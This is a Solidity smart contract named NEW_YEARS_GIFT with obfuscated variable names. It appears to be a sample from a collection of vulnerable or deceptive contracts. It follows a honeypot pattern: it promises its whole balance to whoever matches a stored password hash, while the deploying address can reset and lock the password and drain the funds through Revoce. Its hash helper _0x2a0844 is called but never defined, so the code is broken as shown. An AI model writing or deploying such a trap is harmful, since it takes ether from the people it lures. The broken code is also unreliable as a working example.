// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0xfc5a16;

    bool _0x27f274 = false;

    address sender;

    bytes32 public _0x7c232e;

    function() public payable{}

    function GetHash(bytes _0x4dd9dd) public constant returns (bytes32) {return _0x2a0844(_0x4dd9dd);}

    function SetPass(bytes32 _0x0712f0)
    public
    payable
    {
        if( (!_0x27f274&&(msg.value > 1 ether)) || _0x7c232e==0x0 )
        {
            _0x7c232e = _0x0712f0;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0x36100d)
    public
    {
        if(msg.sender==sender)
        {
            _0xfc5a16 =_0x36100d;
        }
    }

    function GetGift(bytes _0x4dd9dd)
    external
    payable
    returns (string)
    {
        if(_0x7c232e == _0x2a0844(_0x4dd9dd))
        {
            msg.sender.transfer(this.balance);
            return _0xfc5a16;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0xfc5a16="";
        }
    }

    function PassHasBeenSet(bytes32 _0x0712f0)
    public
    {
        if(msg.sender==sender&&_0x0712f0==_0x7c232e)
        {
           _0x27f274=true;
        }
    }
}